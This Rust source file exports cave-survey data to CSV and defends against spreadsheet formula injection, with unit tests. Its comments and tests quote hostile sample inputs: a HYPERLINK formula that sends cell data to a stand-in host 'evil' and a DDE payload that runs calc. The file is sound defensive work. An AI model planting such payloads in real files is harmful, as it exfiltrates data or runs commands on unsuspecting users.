use anyhow::{Context, Result};
use std::io::Write;
use std::path::Path;

use super::atomic_write::write_atomic;
use crate::models::{Project, StationRef};

/// Export project data to CSV format
pub fn export_csv(project: &Project, path: &Path) -> Result<()> {
    write_atomic(path, |file| write_csv(project, file)).context("Failed to write CSV file")?;
    tracing::info!(path = ?path, "Exported CSV");
    Ok(())
}

/// The CSV header. A shot is identified the way the user reads it: its line
/// by name and its two stations by name (`from`, `to`) and by Station ID
/// (`from_id`, `to_id`); the internal line and shot ids are not written.
pub const CSV_HEADER: &str = "line,from,to,from_id,to_id,length,azimuth_in,azimuth_out,depth_in,depth_out,left,right,up,down,kind,comment";

/// A line's station names and Station IDs, by station index (empty text for
/// a station a normalization has not reached).
pub(crate) fn station_columns(project: &Project, line_id: u32) -> Vec<(String, String)> {
    project
        .line_station_names(line_id)
        .into_iter()
        .enumerate()
        .map(|(index, name)| {
            let id = project
                .station_id_at(StationRef::new(line_id, index as u32))
                .map(|id| id.to_string())
                .unwrap_or_default();
            (name.unwrap_or_default(), id)
        })
        .collect()
}

fn write_csv(project: &Project, file: &mut impl Write) -> Result<()> {
    writeln!(file, "{CSV_HEADER}")?;

    // Write shots
    for line in &project.lines {
        let line_name = line.name.as_deref().unwrap_or("");
        let stations = station_columns(project, line.id);
        let station = |index: usize| stations.get(index).cloned().unwrap_or_default();

        for (index, shot) in line.shots.iter().enumerate() {
            let (from, from_id) = station(index);
            let (to, to_id) = station(index + 1);
            writeln!(
                file,
                "{},{},{},{},{},{:.2},{:.1},{:.1},{:.2},{:.2},{},{},{},{},{},{}",
                escape_csv(line_name),
                escape_csv(&from),
                escape_csv(&to),
                from_id,
                to_id,
                shot.length,
                shot.azimuth_in,
                shot.azimuth_out,
                shot.depth_in,
                shot.depth_out,
                format_optional(shot.left),
                format_optional(shot.right),
                format_optional(shot.up),
                format_optional(shot.down),
                shot.kind.label(),
                escape_csv(shot.comment.as_deref().unwrap_or(""))
            )?;
        }
    }
    Ok(())
}

/// Escape a string for CSV, and defuse spreadsheet formula injection.
///
/// Two separate jobs:
///
/// 1. **RFC 4180 quoting** for a field containing a delimiter, a quote or a line
///    break. `\r` counts: a lone CR ends a record in some readers, so a comment
///    holding one would otherwise split a row.
///
/// 2. **Formula neutralisation.** Excel, LibreOffice and Sheets evaluate a cell
///    whose text begins with `=`, `+`, `-`, `@`, tab or CR - quoting does NOT
///    stop this, the formula is parsed after the CSV layer is stripped. The two
///    fields that reach here (`line_name`, `shot.comment`) are attacker
///    controlled: they come verbatim out of an imported `.tml` / `.dat` /
///    `.srv`, so a comment of `=HYPERLINK("http://evil/"&A1,"ok")` would run on
///    open. A leading apostrophe is the standard mitigation (OWASP).
///
/// The `-` case is deliberately included even though it costs a cosmetic
/// apostrophe on a legitimate comment like `-2m to the floor`: `-1+1` is a
/// formula too, and there is no way to tell the two apart without guessing.
/// The station-name columns (`from`, `to`) go through it as well: a name is
/// user text, and an imported one is file-controlled.
pub(crate) fn escape_csv(s: &str) -> String {
    // Order matters: neutralise first, then quote, so the apostrophe is inside
    // the quotes rather than stranded outside them.
    let neutralised = if s.starts_with(['=', '+', '-', '@', '\t', '\r']) {
        format!("'{s}")
    } else {
        s.to_string()
    };
    if neutralised.contains([',', '"', '\n', '\r']) {
        format!("\"{}\"", neutralised.replace('"', "\"\""))
    } else {
        neutralised
    }
}

/// Format an optional f64 value
pub(crate) fn format_optional(value: Option<f64>) -> String {
    value.map(|v| format!("{v:.2}")).unwrap_or_default()
}

#[cfg(test)]
#[expect(clippy::unwrap_used)]
mod tests {
    use super::*;
    use crate::models::{LineData, ShotData};
    use tempfile::NamedTempFile;

    #[test]
    fn test_export_csv() {
        let mut project = Project::new("Test".to_string(), None);
        project.add_line(LineData {
            name: Some("Main".to_string()),
            surveyor: None,
            date: None,
            color: "#4ecdc4".to_string(),
            direction: None,
            quality: 1.0,
            shots: vec![ShotData {
                azimuth_in: 45.0,
                azimuth_out: 225.0,
                length: 10.0,
                depth_in: 5.0,
                depth_out: 6.0,
                ..Default::default()
            }],
        });

        let file = NamedTempFile::new().unwrap();
        let result = export_csv(&project, file.path());
        assert!(result.is_ok());

        let contents = std::fs::read_to_string(file.path()).unwrap();
        assert!(contents.starts_with(CSV_HEADER));
        assert!(contents.contains("Main"));
        assert!(contents.contains("10.00"));
    }

    #[test]
    fn test_escape_csv_handles_commas_quotes_and_newlines() {
        assert_eq!(escape_csv("plain"), "plain");
        assert_eq!(escape_csv("a,b"), "\"a,b\"");
        assert_eq!(escape_csv("a\"b"), "\"a\"\"b\"");
        assert_eq!(escape_csv("a\nb"), "\"a\nb\"");
        assert_eq!(escape_csv("a,\"b\""), "\"a,\"\"b\"\"\"");
    }

    #[test]
    fn test_escape_csv_neutralises_spreadsheet_formulas() {
        // A comment or line name comes verbatim out of an imported survey
        // file, so it is attacker-controlled. Quoting alone does NOT stop a
        // formula - Excel parses the cell text after the CSV layer is stripped.
        assert_eq!(
            escape_csv(r#"=HYPERLINK("http://evil/","ok")"#),
            r#""'=HYPERLINK(""http://evil/"",""ok"")""#,
            "the apostrophe must land INSIDE the quotes"
        );
        for lead in ['=', '+', '-', '@', '\t'] {
            let field = format!("{lead}1+1");
            assert_eq!(escape_csv(&field), format!("'{field}"), "lead {lead:?}");
        }
        // A lone CR would end the record in some readers, so it quotes too.
        assert_eq!(escape_csv("a\rb"), "\"a\rb\"");
        assert_eq!(escape_csv("\rlead"), "\"'\rlead\"");
        // Text that merely CONTAINS an operator is left alone - only the first
        // character decides, matching how the spreadsheets themselves parse.
        assert_eq!(escape_csv("2+2 m to the floor"), "2+2 m to the floor");
        assert_eq!(escape_csv("Main"), "Main");
        assert_eq!(escape_csv(""), "");
    }

    /// The exact table `e2e/agent/lib/exportOracles.ts`'s `escapeCsvMirror`
    /// mirrors, kept here so a change to `escape_csv` fails on THIS side too.
    ///
    /// The agent harness cannot call this function: `export-roundtrip-fuzz`
    /// seeds hostile comments, exports a CSV and then re-checks every cell
    /// against a TypeScript reimplementation of the rule below. A copy that
    /// drifted would go on agreeing with a broken exporter, which is the one
    /// failure mode a neutralisation check must not have. The two halves are
    /// therefore pinned against the same table from both languages; if you
    /// change the rule, change both.
    ///
    /// The three rows nobody reconstructs correctly from memory are the last
    /// three: a leading TAB is neutralised and NOT quoted (tab is in no
    /// quote-trigger set), a leading LF is quoted and NOT neutralised (LF is in
    /// no neutralisation set), and an empty string stays empty.
    #[test]
    fn escape_csv_matches_the_agent_harness_mirror_table() {
        let table: &[(&str, &str)] = &[
            ("", ""),
            ("plain", "plain"),
            ("=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"),
            ("+1+1", "'+1+1"),
            ("-2+3", "'-2+3"),
            ("@SUM(1)", "'@SUM(1)"),
            ("\tleading tab", "'\tleading tab"),
            (
                "\rleading carriage return",
                "\"'\rleading carriage return\"",
            ),
            ("\nleading newline", "\"\nleading newline\""),
            ("a,b", "\"a,b\""),
            ("say \"hi\"", "\"say \"\"hi\"\"\""),
            ("line1\nline2", "\"line1\nline2\""),
            ("=a,b", "\"'=a,b\""),
            ("x=1", "x=1"),
            ("\u{6d1e}\u{7a74}", "\u{6d1e}\u{7a74}"),
            ("part one\u{200b}part two", "part one\u{200b}part two"),
        ];
        for (input, expected) in table {
            assert_eq!(&escape_csv(input), expected, "input {input:?}");
        }
    }

    #[test]
    fn test_format_optional_outputs_two_decimals_or_empty() {
        assert_eq!(format_optional(Some(1.234)), "1.23");
        assert_eq!(format_optional(Some(1.235)), "1.24");
        assert_eq!(format_optional(None), "");
    }

    #[test]
    fn test_export_csv_empty_project() {
        let project = Project::new("Empty".to_string(), None);
        let file = NamedTempFile::new().unwrap();
        let result = export_csv(&project, file.path());
        assert!(result.is_ok(), "empty project CSV export should succeed");
        let contents = std::fs::read_to_string(file.path()).unwrap();
        // Should have header row but no data rows
        assert!(contents.starts_with(CSV_HEADER));
        let rows: Vec<&str> = contents.lines().collect();
        assert_eq!(rows.len(), 1, "only header row expected for empty project");
    }

    #[test]
    fn test_export_csv_unicode_line_name() {
        let mut project = Project::new("Unicode".to_string(), None);
        project.add_line(LineData {
            name: Some("Grotte de l'Ours 🐻".to_string()),
            surveyor: Some("José García".to_string()),
            date: None,
            color: "#ff0000".to_string(),
            direction: None,
            quality: 1.0,
            shots: vec![ShotData {
                azimuth_in: 45.0,
                azimuth_out: 225.0,
                length: 10.0,
                depth_in: 5.0,
                depth_out: 6.0,
                ..Default::default()
            }],
        });

        let file = NamedTempFile::new().unwrap();
        let result = export_csv(&project, file.path());
        assert!(result.is_ok());
        let contents = std::fs::read_to_string(file.path()).unwrap();
        // CSV only exports line_name, not surveyor - verify Unicode line name
        assert!(
            contents.contains("Grotte de l'Ours"),
            "Unicode line name should be in CSV"
        );
    }

    #[test]
    fn test_escape_csv_empty_string() {
        assert_eq!(escape_csv(""), "");
    }

    #[test]
    fn test_export_csv_multiple_lines() {
        let mut project = Project::new("Multi".to_string(), None);
        for i in 0..3 {
            project.add_line(LineData {
                name: Some(format!("Sec{i}")),
                color: "#ff0000".to_string(),
                shots: vec![ShotData {
                    azimuth_in: 0.0,
                    azimuth_out: 180.0,
                    length: f64::from(i + 1) * 5.0,
                    depth_in: 0.0,
                    depth_out: 1.0,
                    ..Default::default()
                }],
                ..Default::default()
            });
        }

        let file = NamedTempFile::new().unwrap();
        let result = export_csv(&project, file.path());
        assert!(result.is_ok());
        let contents = std::fs::read_to_string(file.path()).unwrap();
        let data_rows = contents.lines().skip(1).count();
        assert_eq!(data_rows, 3, "should have one row per shot");
    }

    /// A row names the shot the way the user reads it: line name, station
    /// names, Station IDs - and escapes a hostile station name like any text.
    #[test]
    fn rows_carry_station_names_and_ids() {
        let mut project = Project::new("Ids".to_string(), None);
        let line = project
            .add_line(LineData {
                name: Some("Main".to_string()),
                color: "#ff0000".to_string(),
                shots: vec![ShotData::default(), ShotData::default()],
                ..Default::default()
            })
            .id;
        project.ensure_station_identities();
        project
            .set_station_name(StationRef::new(line, 1), "=cmd")
            .unwrap();
        let mut out = Vec::new();
        write_csv(&project, &mut out).unwrap();
        let text = String::from_utf8(out).unwrap();
        let rows: Vec<&str> = text.lines().collect();
        assert_eq!(rows[0], CSV_HEADER);
        assert!(rows[1].starts_with("Main,0,'=cmd,0,1,"), "{}", rows[1]);
        assert!(rows[2].starts_with("Main,'=cmd,2,1,2,"), "{}", rows[2]);
    }
}
